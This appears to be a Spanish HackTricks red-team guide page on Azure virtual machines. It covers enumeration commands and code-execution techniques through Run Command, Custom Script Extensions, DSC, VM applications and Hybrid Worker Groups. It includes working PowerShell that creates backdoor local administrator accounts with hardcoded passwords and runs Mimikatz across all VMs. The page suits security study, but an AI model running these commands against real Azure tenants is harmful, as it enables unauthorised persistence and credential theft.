# Az - M谩quinas Virtuales y Red

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informaci贸n b谩sica

[De la documentaci贸n:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Las m谩quinas virtuales de Azure son uno de varios tipos de [recursos de computaci贸n escalables bajo demanda](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) que ofrece Azure. T铆picamente, eliges una m谩quina virtual cuando necesitas m谩s control sobre el entorno de computaci贸n que las otras opciones ofrecen. Este art铆culo te proporciona informaci贸n sobre lo que debes considerar antes de crear una m谩quina virtual, c贸mo crearla y c贸mo gestionarla.

## Informaci贸n de Red de Azure

Las redes de Azure contienen **diferentes entidades y formas de configurarlas.** Puedes encontrar una breve **descripci贸n,** **ejemplos** y comandos de **enumeraci贸n** de las diferentes entidades de red de Azure en:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** ofrece una soluci贸n segura y completamente gestionada de acceso RDP (Protocolo de Escritorio Remoto) y SSH (Shell Seguro) a trav茅s de SSL mediante el portal de Azure. Est谩 integrado dentro de una Red Virtual de Azure, permitiendo conectividad RDP y SSH a las m谩quinas virtuales utilizando IPs privadas, evitando la necesidad de IPs p煤blicas. Esto lo convierte en una alternativa m谩s segura y conveniente a los m茅todos tradicionales que implican asignaciones de IP p煤blicas y configuraciones de reglas NSG para el acceso a m谩quinas virtuales. Los desarrolladores y el personal de TI pueden acceder de forma segura a las m谩quinas virtuales desde el portal de Azure utilizando sus navegadores web, agilizando el proceso para entornos de desarrollo y pruebas.

Para listar todos los Hosts de Azure Bastion en tu suscripci贸n, puedes usar el siguiente comando:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Enumeraci贸n de VM
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Ejecutar comandos en una VM**

### **Inicio de sesi贸n AAD en VM**

Es posible permitir el acceso a usuarios autenticados a trav茅s de AzureAD. Por ejemplo, al intentar acceder a una **linux VM**: `ssh username@azure-corp.com@1.1.1.1` (es importante **usar el correo electr贸nico** con el azurecorp utilizado al intentar iniciar sesi贸n) podr铆as obtener un error como:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Simplemente **sigue esas instrucciones** yendo a [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) e indicando el c贸digo, usa el correo electr贸nico y la contrase帽a como credenciales y podr谩s conectarte a trav茅s de SSH (si ese usuario tiene suficientes permisos para hacerlo: rol de `Inicio de sesi贸n de administrador de m谩quina virtual` o `Inicio de sesi贸n de usuario de m谩quina virtual`).

### **Ejecutar comando**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Ejecutar Extensi贸n de Script Personalizado**

Las extensiones de m谩quina virtual (VM) de Azure son **peque帽as aplicaciones** que proporcionan configuraci贸n y automatizaci贸n **tareas** posteriores a la implementaci贸n en **VMs de Azure**. Por ejemplo, si una m谩quina virtual requiere instalaci贸n de software, protecci贸n antivirus o la capacidad de ejecutar un script dentro de ella, puedes usar una extensi贸n de VM.

Por lo tanto, si tienes acceso para escribirlo, puedes ejecutar c贸digo arbitrario:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) es una herramienta de PowerShell similar a Ansible, utilizada para configurar un host a trav茅s de c贸digo. DSC se integra con Azure, permitiendo la carga de archivos de configuraci贸n espec铆ficos. Estos archivos deben adherirse a una sintaxis estricta. Notablemente, la extensi贸n DSC en Azure puede ejecutar comandos de archivos que cumplen con ciertos criterios de formato, incluso si la sintaxis no es correcta seg煤n los est谩ndares de DSC, como se muestra en la figura proporcionada.

La ejecuci贸n de estos comandos es facilitada por la [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) funci贸n en Az PowerShell. Los requisitos incluyen un archivo **.PS1** con una funci贸n definida y el archivo debe estar comprimido en un archivo **.zip**. Aunque la sintaxis puede no ser precisa para DSC, el c贸digo a煤n se ejecutar谩. Sin embargo, la extensi贸n marcar谩 el estado de ejecuci贸n como "fallo", y no se ver谩 ninguna salida del comando debido a que el estado es sobrescrito por el mensaje de fallo.

### VM Application Definitions

Las Definiciones de Aplicaciones de VM permiten el despliegue repetible de aplicaciones versionadas en una VM de Azure. Este recurso admite el despliegue y la actualizaci贸n de aplicaciones en VMs. Para configurar esto, se requieren varios pasos, que implican comandos como **`New-AzGalleryApplication`** y **`New-AzGalleryApplicationVersion`** en Az PowerShell.

La ejecuci贸n de aplicaciones o comandos a trav茅s de este m茅todo involucra la **"VMAppExtension"**, que se instala autom谩ticamente cuando se aplica una aplicaci贸n a una VM. La extensi贸n recupera el archivo de la URI especificada y lo nombra exactamente como la aplicaci贸n, sin una extensi贸n. Para ejecutar el archivo correctamente, el campo "ManageActions" en la llamada a la API REST debe configurarse para renombrar el archivo con la extensi贸n apropiada. La configuraci贸n de este m茅todo, una vez completada, se parecer谩 a la estructura mostrada en la figura proporcionada.

Sin embargo, este m茅todo de ejecuci贸n es relativamente lento, tardando alrededor de 3-4 minutos en ejecutar una aplicaci贸n o comando. Los archivos relacionados con este proceso se almacenan en directorios espec铆ficos (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` para la copia de la aplicaci贸n y `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` para el estado de ejecuci贸n).

Ambas t茅cnicas proporcionan formas 煤nicas de ejecutar comandos y desplegar aplicaciones en entornos de Azure, cada una con su propio conjunto de requisitos, pasos y consideraciones.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) son una caracter铆stica en Azure que permite que los Runbooks, configurados en una Cuenta de Automatizaci贸n, se ejecuten en una M谩quina Virtual (VM) de Azure que forma parte del HWG designado. Esta ejecuci贸n es facilitada a trav茅s de una extensi贸n instalada en la VM, que despliega el c贸digo del Runbook en la VM. Un aspecto significativo de este proceso es que las credenciales reales no son un factor en la ejecuci贸n porque el c贸digo se ejecuta con privilegios elevados, espec铆ficamente como **SYSTEM** o root, como se ilustra en la figura proporcionada.

Un detalle crucial para aquellos que utilizan VMs de Windows 10 es la necesidad de especificar la versi贸n de PowerShell para el Runbook. Debe configurarse para ejecutarse como PowerShell Versi贸n 5.1 en lugar de 7.1. Este requisito surge del hecho de que PowerShell 7.1 no est谩 instalado por defecto en estas VMs, lo que lleva a un fallo en la ejecuci贸n del script si se especifica la versi贸n 7.1.

Esta caracter铆stica de Azure ofrece un m茅todo robusto para automatizar y gestionar tareas en entornos h铆bridos, permitiendo la gesti贸n y ejecuci贸n centralizada de tareas en VMs de Azure.

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
